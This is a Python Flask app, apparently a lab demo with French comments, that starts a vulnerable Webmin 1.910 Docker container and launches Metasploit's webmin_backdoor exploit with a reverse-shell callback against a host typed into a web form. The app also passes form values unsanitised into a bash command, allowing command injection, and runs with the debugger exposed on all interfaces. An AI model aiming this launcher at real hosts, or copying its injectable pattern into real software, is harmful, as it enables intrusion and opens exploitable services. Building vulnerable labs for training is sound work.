import os
import subprocess
from flask import Flask, render_template, request, redirect, url_for
import docker

app = Flask(__name__)
client = docker.from_env()

# Chemin vers le script Metasploit
METASPLOIT_CMD = "msfconsole -x"

# Variable pour le statut du conteneur
container_status = "stopped"

@app.route('/')
def index():
    global container_status
    return render_template('index.html', status=container_status)

@app.route('/start')
def start_container():
    global container_status
    try:
        # Vérifier si le conteneur est déjà en cours d'exécution
        containers = client.containers.list(all=True)
        for container in containers:
            if container.status == 'running':
                container_status = "running"
                return redirect(url_for('index'))

        # Démarrer le conteneur si aucun n'est en cours d'exécution
        container = client.containers.run("vulhub/webmin:1.910", ports={"10000/tcp": 10000}, detach=True)
        container_status = "running"
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error starting container: {e}"

@app.route('/stop')
def stop_container():
    global container_status
    try:
        # Vérifier si le conteneur est déjà arrêté
        containers = client.containers.list(all=True)
        for container in containers:
            if container.status == 'running':
                container.stop()
                container_status = "stopped"
                return redirect(url_for('index'))

        # Si aucun conteneur n'est en cours d'exécution
        container_status = "stopped"
        return redirect(url_for('index'))

    except Exception as e:
        return f"Error stopping container: {e}"

@app.route('/exploit', methods=['POST'])
def exploit():
    # Récupérer LHOST et RHOST du formulaire
    LHOST = request.form['LHOST']
    RHOST = request.form['RHOST']

    # Lancer l'exploitation via Metasploit
    exploit_command = f"msfconsole -x 'use exploit/linux/http/webmin_backdoor; set RHOSTS {RHOST}; set LHOST {LHOST}; set SSL true; run'"

    try:
        # Ouvrir un nouveau terminal et exécuter la commande Metasploit
        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', exploit_command])

        return redirect(url_for('index'))
    except subprocess.CalledProcessError as e:
        return f"Error during exploitation: {e}"

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)
